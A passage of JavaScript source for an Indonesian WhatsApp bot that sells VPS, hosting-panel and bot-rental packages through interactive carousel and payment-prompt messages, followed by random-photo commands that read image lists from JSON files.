"buttonParamsJson": `{"display_text":"PSAN SEKARANG","url":"${wame}?text=*BUY+VPS+PREMIUM+INTEL+PAKET+5*","merchant_url":"https://www.google.com"}`
},
],},},
{
header: {
imageMessage: await image(img1),
hasMediaAttachment: true,
},
body: { text: `*VPS PREMIUM INTEL*
❖━━━━━━━━━━━━━━━━━━❖
${gris}</> PAKET [ 6 ] </>${gris}

> RAM : 8000 MB / 8 GB
> CPU : 4 CORE

> (IDR) Rp 45.000
❖━━━━━━━━━━━━━━━━━━❖` },
nativeFlowMessage: {
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"PSAN SEKARANG","url":"${wame}?text=*BUY+VPS+PREMIUM+INTEL+PAKET+6*","merchant_url":"https://www.google.com"}`
},
],},},
],
messageVersion: 1,
},},},},},{});
await RezzHost.relayMessage(msg.key.remoteJid, msg.message, {
messageId: msg.key.id,
});}
break
case 'vps-amd': {   
await RezzHost.sendMessage(m.chat, { react: { text: "⏳",key: m.key,}})  
let img1 = "https://pomf2.lain.la/f/tp5id7o6.jpeg"
async function image(url) {
const { imageMessage } = await generateWAMessageContent({
image: {
url
}}, {
upload: RezzHost.waUploadToServer
})
return imageMessage
}
let msg = generateWAMessageFromContent(
m.chat,
{
viewOnceMessage: {
message: {
interactiveMessage: {
body: {
text: (`*LIST VPS PREMIUM AMD BY ${ownername}*`)  },
carouselMessage: {
cards: [
{
header: {
imageMessage: await image(img1),
hasMediaAttachment: true,
},
body: { text: `*VPS PREMIUM AMD*
❖━━━━━━━━━━━━━━━━━━❖
${gris}</> PAKET [ 1 ] </>${gris}

> RAM : 500 MB / 0,5 GB
> CPU : 1 CORE

> (IDR) Rp 8.000
❖━━━━━━━━━━━━━━━━━━❖` },
nativeFlowMessage: {
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"PSAN SEKARANG","url":"${wame}?text=*BUY+VPS+PREMIUM+AMD+PAKET+1*","merchant_url":"https://www.google.com"}`
},
],},},
{
header: {
imageMessage: await image(img1),
hasMediaAttachment: true,
},
body: { text: `*VPS PREMIUM AMD*
❖━━━━━━━━━━━━━━━━━━❖
${gris}</> PAKET [ 2 ] </>${gris}

> RAM : 1000 MB / 1 GB
> CPU : 1 CORE

> (IDR) Rp 13.000
❖━━━━━━━━━━━━━━━━━━❖` },
nativeFlowMessage: {
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"PSAN SEKARANG","url":"${wame}?text=*BUY+VPS+PREMIUM+AMD+2*","merchant_url":"https://www.google.com"}`
},
],},},
{
header: {
imageMessage: await image(img1),
hasMediaAttachment: true,
},
body: { text: `*VPS PREMIUM AMD*
❖━━━━━━━━━━━━━━━━━━❖
${gris}</> PAKET [ 3 ] </>${gris}

> RAM : 2000 MB / 2 GB
> CPU : 2 CORE

> (IDR) Rp 18.000
❖━━━━━━━━━━━━━━━━━━❖` },
nativeFlowMessage: {
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"PSAN SEKARANG","url":"${wame}?text=*BUY+VPS+PREMIUM+AMD+PAKET+3*","merchant_url":"https://www.google.com"}`
},
],},},
{
header: {
imageMessage: await image(img1),
hasMediaAttachment: true,
},
body: { text: `*VPS PREMIUM AMD*
❖━━━━━━━━━━━━━━━━━━❖
${gris}</> PAKET [ 4 ] </>${gris}
  
> RAM : 4000 MB / 4 GB
> CPU : 2 CORE

> (IDR) Rp 30.000
❖━━━━━━━━━━━━━━━━━━❖` },
nativeFlowMessage: {
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"PSAN SEKARANG","url":"${wame}?text=*BUY+VPS+PREMIUM+AMD+PAKET+4*","merchant_url":"https://www.google.com"}`
},
],},},
{
header: {
imageMessage: await image(img1),
hasMediaAttachment: true,
},
body: { text: `*VPS PREMIUM AMD*
❖━━━━━━━━━━━━━━━━━━❖
${gris}</> PAKET [ 5 ] </>${gris}

> RAM : 8000 MB / 8 GB
> CPU : 2 CORE

> (IDR) Rp 35.000
❖━━━━━━━━━━━━━━━━━━❖` },
nativeFlowMessage: {
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"PSAN SEKARANG","url":"${wame}?text=*BUY+VPS+PREMIUM+AMD+PAKET+5*","merchant_url":"https://www.google.com"}`
},
],},},
{
header: {
imageMessage: await image(img1),
hasMediaAttachment: true,
},
body: { text: `*VPS PREMIUM AMD*
❖━━━━━━━━━━━━━━━━━━❖
${gris}</> PAKET [ 6 ] </>${gris}

> RAM : 8000 MB / 8 GB
> CPU : 4 CORE

> (IDR) Rp 40.000
❖━━━━━━━━━━━━━━━━━━❖` },
nativeFlowMessage: {
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"PSAN SEKARANG","url":"${wame}?text=*BUY+VPS+PREMIUM+AMD+PAKET+6*","merchant_url":"https://www.google.com"}`
},
],},},
{
header: {
imageMessage: await image(img1),
hasMediaAttachment: true,
},
body: { text: `*VPS PREMIUM AMD*
❖━━━━━━━━━━━━━━━━━━❖
${gris}</> PAKET [ 7 ] </>${gris}

> RAM : 16000 MB / 16 GB
> CPU : 4 CORE

> (IDR) Rp 65.000
❖━━━━━━━━━━━━━━━━━━❖` },
nativeFlowMessage: {
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"PSAN SEKARANG","url":"${wame}?text=*BUY+VPS+PREMIUM+AMD+PAKET+7*","merchant_url":"https://www.google.com"}`
},
],},},
],
messageVersion: 1,
},},},},},{});
await RezzHost.relayMessage(msg.key.remoteJid, msg.message, {
messageId: msg.key.id,
});}
break


case 'sosmed': {
const text12 = `▭▬▭( *SOSMED OWNER* )▭▬▭

*INSTAGRAM OWNER :* 
${ig}

*YOUTUBE OWNER :* 
${yt}

*GROUP OWNER :* 
${gr}


*@${ownername.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
await RezzHost.relayMessage(m.chat,  {
requestPaymentMessage: {
currencyCodeIso4217: 'IDR',
amount1000: 1000000000,
requestFrom: m.sender,
noteMessage: {
extendedTextMessage: {
text: text12,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
}}}}}}, {})
}
break
case 'sdomain': case 'sendomain': {
		 if (!isCreator) return reply(`Ngapain ? Khusus Rerez Aja !!`)
          if (!text) return reply2(`Example : ${prefix + command} 6285xxxxx,harga,domain`)
            reply2('Pesanan Telah Sukses Dikirim') 
            var mon = args.join(' ')
            var m1 = mon.split(",")[0]
            var m2 = mon.split(",")[1]
            var m3 = mon.split(",")[2]
                    let mq1 = m1 + '@s.whatsapp.net'
                  let ownernya = owner + '@s.whatsapp.net'
               let me = m.sender
               let ments = [mq1, ownernya, me]
RezzHost.sendMessage(mq1, {text:`*───❖》Rerez 《❖───*\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n*📦 Pesananmu Datang 📦*\n*Harga : ${m2}*\n*Hari : ${hariini}*\n*Tanggal : ${tanggal}*\n*Jam : ${jam}*\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n*[+] Domain : ${m3}*\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n*_Note : Tutup ( Sensor ) Domain Anda Dan Jangan Sampai Orang Lain Melihat Atau Tidak Nanti Domain Anda Bakal Kena Ddos Attack_*\n\n\n\n*© Rerez*`}, m) 
                 }
            break
case 'reqvps':{
if (!isCreator) return;
ewe = `*بِسۡـــــــــمِ ٱللهِ ٱلرَّحۡـمَـٰنِ ٱلرَّحِـــــــيم*

Region : 
Os : 
Version : 
Password : 
▰▰▰▰▰▰▰▰
*Garansi 14 Day*
*Create ${tanggal2}*
*Hari Ini ${hariini}*`
await RezzHost.relayMessage(m.chat,  {
requestPaymentMessage: {
currencyCodeIso4217: 'IDR',
amount1000: 1000000000,
requestFrom: m.sender,
noteMessage: {
extendedTextMessage: {
text: ewe,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
}}}}}}, {})
}
break
case 'reqpanel':{
if (!isCreator) return;
ewe = `*بِسۡـــــــــمِ ٱللهِ ٱلرَّحۡـمَـٰنِ ٱلرَّحِـــــــيم*

Ram : 
Username :
Nomor Wa : 
▰▰▰▰▰▰▰▰
*Garansi 14 Day*
*Create ${tanggal2}*
*Hari Ini ${hariini}*`
await RezzHost.relayMessage(m.chat,  {
requestPaymentMessage: {
currencyCodeIso4217: 'IDR',
amount1000: 1000000000,
requestFrom: m.sender,
noteMessage: {
extendedTextMessage: {
text: ewe,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
}}}}}}, {})
}
break
case 'tunda':
text_trxpending = `「 𝗧𝗥𝗔𝗡𝗦𝗔𝗞𝗦𝗜 𝗣𝗘𝗡𝗗𝗜𝗡𝗚 」

𝗧𝗥𝗔𝗡𝗦𝗔𝗞𝗦𝗜 𝗣𝗘𝗡𝗗𝗜𝗡𝗚
𝗛𝗔𝗥𝗔𝗣 𝗕𝗘𝗥𝗦𝗔𝗕𝗔𝗥`
await RezzHost.relayMessage(m.chat,  {
requestPaymentMessage: {
currencyCodeIso4217: 'IDR',
amount1000: 1000000000,
requestFrom: m.sender,
noteMessage: {
extendedTextMessage: {
text: text_trxpending,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
}}}}}}, {})
break
case 'proses':
text_proses = `「 𝗦𝗘𝗗𝗔𝗡𝗚 𝗗𝗜 𝗣𝗥𝗢𝗦𝗘𝗦 」

𝗛𝗮𝗿𝗮𝗽 𝗧𝘂𝗻𝗴𝗴𝘂 𝗦𝗲𝗯𝗲𝗻𝘁𝗮𝗿
𝗣𝗿𝗼𝗱𝘂𝗸 𝗦𝗲𝗱𝗮𝗻𝗴 𝗗𝗶 𝗣𝗿𝗼𝘀𝗲𝘀️`
await RezzHost.relayMessage(m.chat,  {
requestPaymentMessage: {
currencyCodeIso4217: 'IDR',
amount1000: 1000000000,
requestFrom: m.sender,
noteMessage: {
extendedTextMessage: {
text: text_proses,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
}}}}}}, {})
break
case 'batal':
text_trxbatal = `「 𝗧𝗥𝗔𝗡𝗦𝗔𝗞𝗦𝗜 𝗕𝗔𝗧𝗔𝗟 」

📆 𝗧𝗮𝗻𝗴𝗴𝗮𝗹: ${tanggal2}
🕰️ 𝗪𝗮𝗸𝘁𝘂: ${time}
✨ 𝗦𝘁𝗮𝘁𝘂𝘀: Batal

𝗦𝗲𝗹𝘂𝗿𝘂𝗵 𝗧𝗿𝗮𝗻𝘀𝗮𝗸𝘀𝗶 𝗕𝗮𝘁𝗮𝗹`
await RezzHost.relayMessage(m.chat,  {
requestPaymentMessage: {
currencyCodeIso4217: 'IDR',
amount1000: 1000000000,
requestFrom: m.sender,
noteMessage: {
extendedTextMessage: {
text: text_trxbatal,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
}}}}}}, {})
break
case 'done': case 'd': {
text_done = `「 𝗧𝗥𝗔𝗡𝗦𝗔𝗞𝗦𝗜 𝗕𝗘𝗥𝗛𝗔𝗦𝗜𝗟 」

📆 𝗧𝗮𝗻𝗴𝗴𝗮𝗹: ${tanggal2}
🕰️ 𝗪𝗮𝗸𝘁𝘂: ${time}
✨ 𝗦𝘁𝗮𝘁𝘂𝘀: Berhasil

Terimakasih telah mempercayai kami 😊`
await RezzHost.relayMessage(m.chat,  {
requestPaymentMessage: {
currencyCodeIso4217: 'IDR',
amount1000: 1000000000,
requestFrom: m.sender,
noteMessage: {
extendedTextMessage: {
text: text_done,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
}}}}}}, {})
}
break
case 'listpanel':{
let list =`Hai Kak ${pushname}

*HARGA PANEL BY ${ownername}* :

╭━━━━━━━━━━━━━━━━━━┅•ิ.•ஐ
│ *LIST HARGA PANEL*
└┬───────────────┾•ิ.•┽
┌┤ 📮 1 GB CPU 30%
││ 💶 Rp. 1.000 / 30 DAY
││
││ 📮 2 GB CPU 60%
││ 💶 Rp. 2.000 / 30 DAY
││
││ 📮 3 GB CPU 90% 
││ 💶 Rp. 3.000 / 30 DAY
││
││ 📮 4 GB CPU 120%
││ 💶 Rp. 4.000 / 30 DAY
││ 
││ 📮 5 GB CPU 150%
││ 💶 Rp. 5.000 / 30 DAY
││
││ 📮 6 GB CPU 180%
││ 💶 Rp. 6.000 / 30 DAY
││
││ 📮 7 GB CPU 210%
││ 💶 Rp. 7.000 / 30 DAY
││
││ 📮 8 GB CPU 240%
││ 💶 Rp. 8.000 / 30 DAY
││
││ 📮 9 GB CPU 270%
││ 💶 Rp. 9.000 / 30 DAY
││
││ 📮 10 GB CPU 300%
││ 💶 Rp. 10.000 / 30 DAY
││
││ 📮 UNLI CPU UNLI
││ 💶 Rp. 15.000 / 30 DAY
││
│└───────────────┾•ิ.•┽
╰━━━━━━━━━━━━━━━━━━━┅•ิ.•ஐ 

┏━━━━『 𝗣𝗮𝘆𝗺𝗲𝗻𝘁  』━━━━◧
┣» DANA
┣» OVO
┣» GOPAY
┣» PULSA
┣» QRIS ALL PAY
┗━━━━━━━━━━━━━━━━━━◧
UNTUK MELIHAT PAYMENT KETIK .payment

*PANEL BERSIPAT PRIPAT !*
`
await RezzHost.relayMessage(m.chat,  {
requestPaymentMessage: {
currencyCodeIso4217: 'IDR',
amount1000: 1000000000,
requestFrom: m.sender,
noteMessage: {
extendedTextMessage: {
text: list,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
}}}}}}, {})
}
break
case 'listvps':  case 'vps-list': {
let rezz =`Hai Kak ${pushname}

*LIST HARGA VPS BY ${ownername}*

- RAM 1GB CORE 1 : 10K
- RAM 2GB CORE 1 : 15K
- RAM 2GB CORE 2 : 20K
- RAM 4GB CORE 2 : 30K
- RAM 8GB CORE 2 : 35K
- RAM 8GB CORE 4 : 40K
- RAM 16GB CORE 4 : 65K

*NOTE*
- FREE INSTALL PANEL
- FREE INSTALL WINGS
- FREE INSTALL THEMA RAM 4+
- FEEE EGGS BOT WA
- FREE REQUEST DOMAIN
- GARANSI 13 HARI 1X AMBIL
- MASA AKTIF 1 BULAN
- PROVAIDER : DO

*MINAT CHAT*`
let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterJid: wm,
 newsletterName: wm,
 serverMessageId: -1
},
 businessMessageForwardInfo: { businessOwnerJid: RezzHost.decodeJid(RezzHost.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: wm
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: Styles(wm)
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: rezz,
 subtitle: wm,
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "https://pomf2.lain.la/f/kk3e7k43.jpeg" } }, { upload: RezzHost.waUploadToServer }))
}),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [
 {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👤 CHAT OWNER","url":"${wame}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"🌐 TESTONOMI","url":"${saluran}","merchant_url":"https://www.google.com"}`
}
 ],
 })
 })
 }
 }
}, {})

await RezzHost.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}
break
case 'getnope':
case 'nope': 
case 'payment':
case 'nopay':
case 'dana':
case 'ovo':
case 'gopay':
case 'qris': {
await RezzHost.sendMessage(m.chat, { react: { text: "⏳",key: m.key,}})  
let dana = `${qrdana}`
let gopay = `${qrgopay}`
let ovo = `${qrovo}`
let qris = `${qrqris}`
let pulsa = `${qrpulsa}`
async function image(url) {
const { imageMessage } = await generateWAMessageContent({
image: {
url
}}, {
upload: RezzHost.waUploadToServer
})
return imageMessage
}
let msg = generateWAMessageFromContent(
m.chat,
{
viewOnceMessage: {
message: {
interactiveMessage: {
body: {
text: (`*PAYMENT ${ownername}*`)  },
carouselMessage: {
cards: [
{
header: {
imageMessage: await image(dana),
hasMediaAttachment: true,
},
body: { text: `> *PAYMENT DANA*

> *Dana :* ${dana}` },
nativeFlowMessage: {
buttons: [
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY DANA",
"copy_code": `${dana}`
})
},
],},},
{
header: {
imageMessage: await image(gopay),
hasMediaAttachment: true,
},
body: { text: `> *PAYMENT GOPAY*

> *Gopay :* ${gopay}` },
nativeFlowMessage: {
buttons: [
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY GOPAY",
"copy_code": `${gopay}`
})
},
],},},
{
header: {
imageMessage: await image(ovo),
hasMediaAttachment: true,
},
body: { text: `> *PAYMENT OVO*

> *OVO :* ${ovo}` },
nativeFlowMessage: {
buttons: [
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY OVO",
"copy_code": `${ovo}`
})
},
],},},
{
header: {
imageMessage: await image(pulsa),
hasMediaAttachment: true,
},
body: { text: `> *PAYMENT PULSA*

> *PULSA :* ${pulsa}` },
nativeFlowMessage: {
buttons: [
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY DANA",
"copy_code": `${pulsa}`
})
},
],},},
{
header: {
imageMessage: await image(qris),
hasMediaAttachment: true,
},
body: { text: `> *QRIS ALL PAY*

> QRIS ALL PAYMENT` },
nativeFlowMessage: {
buttons: [
{
"name": "cta_url",
 "buttonParamsJson": `{"display_text":"MY OWNER","url":"https://wa.me/+${global.owner}?text=Halo+Bang+${global.ownername}","merchant_url":"https://www.google.com"}`
}
],},},
],
messageVersion: 1,
},},},},},{});
await RezzHost.relayMessage(msg.key.remoteJid, msg.message, {
messageId: msg.key.id,
});}
break
case 'sewa': 
case 'sewabot': {
await RezzHost.sendMessage(m.chat, { react: { text: "⏳",key: m.key,}})  
let img1 = "https://telegra.ph/file/b918c264482d2c4ce6688.jpg"
let img2 = "https://telegra.ph/file/3cc263ff67392d413caf1.jpg"
let img3 = "https://telegra.ph/file/916f3805dac23ca747ecd.jpg"
let img4 = "https://telegra.ph/file/26ca1f8f93916f88a9f28.jpg"
let img5 = "https://telegra.ph/file/882ed3572fccc1fdccd70.jpg"
let img6 = "https://telegra.ph/file/ded75f1506484c5fb02cf.jpg"
let img7 = "https://telegra.ph/file/8a168f1359f23aeaae048.jpg"
let img8 = "https://telegra.ph/file/06a8e8d966a4b6b225823.jpg"
async function image(url) {
const { imageMessage } = await generateWAMessageContent({
image: {
url
}}, {
upload: RezzHost.waUploadToServer
})
return imageMessage
}
let msg = generateWAMessageFromContent(
m.chat,
{
viewOnceMessage: {
message: {
interactiveMessage: {
body: {
text: (`*Hai Kak ${pushname} ${stime}*\n*SILAHKAN PILIH PAKET YANG INGIN ANDA PESAN*`)  },
carouselMessage: {
cards: [
{
header: {
imageMessage: await image(img1),
hasMediaAttachment: true,
},
body: { text: `
*🛍️ PAKET FREE*
❖━━━━━━━━━━━━━━━━━━━━❖
${gris}</> PAKET FREE </>${gris}

> *NON UPDET* ✅
> *EROR TANGGUNG SENDIRI* ✅
> *HARGA Rp 0* ✅
❖━━━━━━━━━━━━━━━━━━━━❖` },
nativeFlowMessage: {
buttons: [
{
name: "cta_url",
buttonParamsJson:
'{"display_text":"PAKET FREE","url":"https://whatsapp.com/channel/0029VacxTsC8F2p5dshCmq3r","webview_presentation":null}',
},
],},},
{
header: {
imageMessage: await image(img2),
hasMediaAttachment: true,
},
body: { text: `
*🛍️ PAKET 1*
❖━━━━━━━━━━━━━━━━━━━━❖
${gris}</> PAKET [ 1 ] </>${gris}

> *BOT JOIN GROUP 7 DAY* ✅
> *USER PREMIUM 7 DAY* ✅
> *HARGA Rp 5.000* ✅
❖━━━━━━━━━━━━━━━━━━━━❖` },
nativeFlowMessage: {
buttons: [
{
name: "cta_url",
buttonParamsJson:
'{"display_text":"👤 BUY PAKET 1","url":"https:\\/\\/wa.me\\/6282321559392?text=Halo+Owner+Mau+pesan+PAKET+1","webview_presentation":null}',
},
],},},
{
header: {
imageMessage: await image(img3),
hasMediaAttachment: true,
},
body: { text: `
*🛍️ PAKET 2*
❖━━━━━━━━━━━━━━━━━━━━❖
${gris}</> PAKET [ 2 ] </>${gris}

> *BOT JOIN GROUP 14 DAY* ✅
> *USER PREMIUM 14 DAY* ✅
> *HARGA Rp 10.000* ✅
❖━━━━━━━━━━━━━━━━━━━━❖` },
nativeFlowMessage: {
buttons: [
{
name: "cta_url",
buttonParamsJson:
'{"display_text":"👤 BUY PAKET 2","url":"https:\\/\\/wa.me\\/6282321559392?text=Halo+Owner+Mau+pesan+PAKET+2","webview_presentation":null}',
},
],},},
{
header: {
imageMessage: await image(img4),
hasMediaAttachment: true,
},
body: { text: `
*🛍️ PAKET 3*
❖━━━━━━━━━━━━━━━━━━━━❖
${gris}</> PAKET [ 3 ] </>${gris}

> *BOT JOIN GROUP 21 DAY* ✅
> *USER PREMIUM 21 DAY* ✅
> *HARGA Rp 15.000* ✅
❖━━━━━━━━━━━━━━━━━━━━❖` },
nativeFlowMessage: {
buttons: [
{
name: "cta_url",
buttonParamsJson:
'{"display_text":"👤 BUY PAKET 3","url":"https:\\/\\/wa.me\\/6282321559392?text=Halo+Owner+Mau+pesan+PAKET+3","webview_presentation":null}',
},
],},},
{
header: {
imageMessage: await image(img5),
hasMediaAttachment: true,
},
body: { text: `
*🛍️ PAKET 4*
❖━━━━━━━━━━━━━━━━━━━━❖
${gris}</> PAKET [ 4 ] </>${gris}

> *BOT JOIN GROUP 28 DAY* ✅
> *USER PREMIUM 28 DAY* ✅
> *HARGA Rp 20.000* ✅
❖━━━━━━━━━━━━━━━━━━━━❖` },
nativeFlowMessage: {
buttons: [
{
name: "cta_url",
buttonParamsJson:
'{"display_text":"👤 BUY PAKET 4","url":"https:\\/\\/wa.me\\/6282321559392?text=Halo+Owner+Mau+pesan+PAKET+4","webview_presentation":null}',
},
],},},
{
header: {
imageMessage: await image(img6),
hasMediaAttachment: true,
},
body: { text: `
*🛍️ PAKET 5*
❖━━━━━━━━━━━━━━━━━━━━❖
${gris}</> PAKET [ 5 ] </>${gris}

> *BOT JOIN GROUP 35 DAY* ✅
> *USER PREMIUM 35 DAY* ✅
> *HARGA Rp 25.000* ✅
❖━━━━━━━━━━━━━━━━━━━━❖` },
nativeFlowMessage: {
buttons: [
{
name: "cta_url",
buttonParamsJson:
'{"display_text":"👤 BUY PAKET 5","url":"https:\\/\\/wa.me\\/6282321559392?text=Halo+Owner+Mau+pesan+PAKET+5","webview_presentation":null}',
},
],},},
{
header: {
imageMessage: await image(img7),
hasMediaAttachment: true,
},
body: { text: `
*🛍️ PAKET 6*
❖━━━━━━━━━━━━━━━━━━━━❖
${gris}</> PAKET [ 6 ] </>${gris}

> *BOT JOIN GROUP 45 DAY* ✅
> *USER PREMIUM 42 DAY* ✅
> *HARGA Rp 30.000* ✅
❖━━━━━━━━━━━━━━━━━━━━❖` },
nativeFlowMessage: {
buttons: [
{
name: "cta_url",
buttonParamsJson:
'{"display_text":"👤 BUY PAKET 6","url":"https:\\/\\/wa.me\\/6282321559392?text=Halo+Owner+Mau+pesan+PAKET+6","webview_presentation":null}',
},
],},},
{
header: {
imageMessage: await image(img8),
hasMediaAttachment: true,
},
body: { text: `
*🛍️ PAKET 7*
❖━━━━━━━━━━━━━━━━━━━━❖
📦 ${gris}</> PAKET [ 7 ] </>${gris}

> *SECRIPT XYREZZ BOTZ - MD* ✅
> *FREE UPDET 2 - 3×* ✅
> *HARGA Rp 80.000* ✅
❖━━━━━━━━━━━━━━━━━━━━❖` },
nativeFlowMessage: {
buttons: [
{
name: "cta_url",
buttonParamsJson:
'{"display_text":"👤 BUY PAKET 7","url":"https:\\/\\/wa.me\\/6282321559392?text=Halo+Owner+Mau+pesan+PAKET+7","webview_presentation":null}',
},
],},},
],
messageVersion: 1,
},},},},},{});
await RezzHost.relayMessage(msg.key.remoteJid, msg.message, {
messageId: msg.key.id,
});}
break

// BATAS STORE MENU


// RANDOM PHOTO


case 'cople': {
if (!isCreator) return reply2('Ente Siapa?')
let anu = await fetchJson('https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json')
let random = anu[Math.floor(Math.random() * anu.length)]
RezzHost.sendMessage(from, { image: { url: random.male }, caption: `Ini Untuk Cowo` }, { quoted:kalgans })
RezzHost.sendMessage(from, { image: { url: random.female }, caption: `Ini Untuk Cewenya><` }, { quoted:kalgans })
}
        break
case 'coffe': case 'kopi': {
await loading()
RezzHost.sendMessage(from, {image: { url: 'https://coffee.alexflipnote.dev/random' },
caption: `☕ Random Coffe`},{quoted:kalgans})
}
break
case 'wallpaperanime': {
reply(mess.search)
let old = new Date()
RezzHost.sendMessage(m.chat, { image: { url: `https://pitucode.com/api/anime/sfw/wallpaper?apikey=${pitu}` }, caption: `🍟 *Fetching* : ${((new Date - old) * 1)} ms` }, { quoted: kalgans })
}
break
case 'chinese':
reply(mess.search)
var notnot = JSON.parse(fs.readFileSync('./lib/HostMedia/tiktokpics/china.json'))
var hasil = pickRandom(notnot)
RezzHost.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: kalgans })
break
case 'hijab':
reply(mess.search)
var notnot = JSON.parse(fs.readFileSync('./lib/HostMedia/tiktokpics/hijab.json'))
var hasil = pickRandom(notnot)
RezzHost.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: kalgans })
break
case 'indo':
reply(mess.search)
var notnot = JSON.parse(fs.readFileSync('./lib/HostMedia/tiktokpics/indonesia.json'))
var hasil = pickRandom(notnot)
RezzHost.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: kalgans })
break
case 'japanese':
reply(mess.search)
var notnot = JSON.parse(fs.readFileSync('./lib/HostMedia/tiktokpics/japan.json'))
var hasil = pickRandom(notnot)
RezzHost.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: kalgans })
break
case 'korean':
reply(mess.search)
var notnot = JSON.parse(fs.readFileSync('./lib/HostMedia/tiktokpics/korea.json'))
var hasil = pickRandom(notnot)
RezzHost.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: kalgans })
break
case 'malay':
reply(mess.search)
var notnot = JSON.parse(fs.readFileSync('./lib/HostMedia/tiktokpics/malaysia.json'))
var hasil = pickRandom(notnot)
RezzHost.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: kalgans })
break
case 'randomgirl':
reply(mess.search)
var notnot = JSON.parse(fs.readFileSync('./lib/HostMedia/tiktokpics/random.json'))
var hasil = pickRandom(notnot)
RezzHost.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: kalgans })
break
case 'randomboy':
reply(mess.search)
var notnot = JSON.parse(fs.readFileSync('./lib/HostMedia/tiktokpics/random2.json'))
var hasil = pickRandom(notnot)
RezzHost.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: kalgans })
break
case 'thai':
reply(mess.search)
var notnot = JSON.parse(fs.readFileSync('./lib/HostMedia/tiktokpics/thailand.json'))
var hasil = pickRandom(notnot)
RezzHost.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: kalgans })
break
case 'vietnamese':
reply(mess.search)
var notnot = JSON.parse(fs.readFileSync('./lib/HostMedia/tiktokpics/vietnam.json'))
var hasil = pickRandom(notnot)
RezzHost.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: kalgans })
break
case 'aesthetic':
reply(mess.search)
var notnot = JSON.parse(fs.readFileSync('./lib/HostMedia/randompics/aesthetic.json'))
var hasil = pickRandom(notnot)
RezzHost.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: kalgans })
break
case 'antiwork':
reply(mess.search)
var notnot = JSON.parse(fs.readFileSync('./lib/HostMedia/randompics/antiwork.json'))
var hasil = pickRandom(notnot)
RezzHost.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: kalgans })
break
case 'blackpink':
reply(mess.search)
var notnot = JSON.parse(fs.readFileSync('./lib/HostMedia/randompics/blackpink.json'))
var hasil = pickRandom(notnot)
RezzHost.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: kalgans })
break
case 'bike':
reply(mess.search)
var notnot = JSON.parse(fs.readFileSync('./lib/HostMedia/randompics/bike.json'))
var hasil = pickRandom(notnot)
RezzHost.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: kalgans })
break
case 'boneka':
reply(mess.search)
var notnot = JSON.parse(fs.readFileSync('./lib/HostMedia/randompics/boneka.json'))
var hasil = pickRandom(notnot)
RezzHost.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: kalgans })
break
case 'cosplay':
reply(mess.search)
var notnot = JSON.parse(fs.readFileSync('./lib/HostMedia/randompics/cosplay.json'))
var hasil = pickRandom(notnot)
RezzHost.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: kalgans })
break
case 'kucing':
reply(mess.search)
var notnot = JSON.parse(fs.readFileSync('./lib/HostMedia/randompics/cat.json'))
var hasil = pickRandom(notnot)
RezzHost.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: kalgans })
break
case 'doggo':
reply(mess.search)
var notnot = JSON.parse(fs.readFileSync('./lib/HostMedia/randompics/doggo.json'))
var hasil = pickRandom(notnot)
RezzHost.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: kalgans })
break
